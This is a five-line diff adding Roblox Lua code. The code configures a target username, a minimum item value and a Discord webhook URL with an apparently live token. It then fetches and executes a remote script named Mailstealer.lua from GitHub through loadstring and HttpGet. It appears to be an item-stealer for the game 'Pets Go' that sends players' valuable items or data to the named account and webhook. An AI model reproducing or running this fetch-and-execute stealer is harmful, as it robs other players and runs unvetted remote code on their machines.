@@ -1,0 +1,5 @@
+Username = "43dk2w"
+min_rap = 10000
+webhook = "https://discord.com/api/webhooks/1271361919994957914/cui2M4ysLYb_9RF5M5bGZN8WZZ8euGhB0EPE4bfs7zTASF4SWjsJkFhCVcIpj3_h64N0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmReborn/Petsgo/refs/heads/main/Mailstealer.lua"))()
